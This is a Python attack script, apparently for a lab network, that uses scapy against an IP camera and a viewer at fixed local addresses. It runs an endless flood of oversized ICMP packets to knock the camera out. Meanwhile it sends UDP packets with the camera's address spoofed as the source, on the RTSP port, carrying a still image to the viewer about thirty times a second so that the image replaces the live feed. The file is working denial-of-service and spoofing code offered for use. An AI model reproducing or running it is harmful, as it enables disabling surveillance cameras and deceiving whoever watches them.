from PIL import Image
from scapy.all import *
import threading
import time

camera_ip = "192.168.88.115"
victim_ip = "192.168.88.110"

# Resize the image to 1920x1080
input_image_path = "img.png"
output_image_path = "img_resized.png"

def resize_image(image_path, output_path, size):
    with Image.open(image_path) as img:
        img = img.resize(size, Image.ANTIALIAS)
        img.save(output_path)

print("resizing")
resize_image(input_image_path, output_image_path, (1920, 1080))
print("resizing done")

# Load resized image payload
def load_image_as_payload(image_path):
    with open(image_path, 'rb') as image_file:
        return image_file.read()

print("doing image payload")
image_payload = load_image_as_payload(output_image_path)
print("image payload done")

# Start DoS
def DoS(target_ip):
    while True:
        packet = IP(dst=target_ip)/ICMP()/Raw(load="A"*(65507))
        send(packet, verbose=False)
        print("packets sent")

flood_thread = threading.Thread(target=DoS, args=(camera_ip,))
flood_thread.start()


# Create packets that together composes the fake image (the last packet will have less bytes than the other packets)
print("creating packets")
list_of_packets = []
while len(image_payload) > 0:
    current_payload = image_payload[:65000] # 65000 bytes
    image_payload = image_payload[65000:] # Delete the first 65000 bytes in the list
    list_of_packets.append(IP(src=camera_ip, dst=victim_ip)/UDP(sport=554, dport=554)/Raw(load=current_payload))

print("packets done, amount of packets", len(list_of_packets))

# Change from video to fake image
def send_fake_video():
    i = 0
    while True:
        # Send all packets from the image every 1/30 seconds
        for j in range (len(list_of_packets)):
            send(list_of_packets[j], verbose=False)
            time.sleep(0.000001)
        time.sleep(0.0333)
        print("all packets sent")
        i = i + 1
        if i == 30:
            print("30 frames, 1 second")
            i = 0

print("send fake image")
send_fake_video()
print("this line shouldn't be reached")
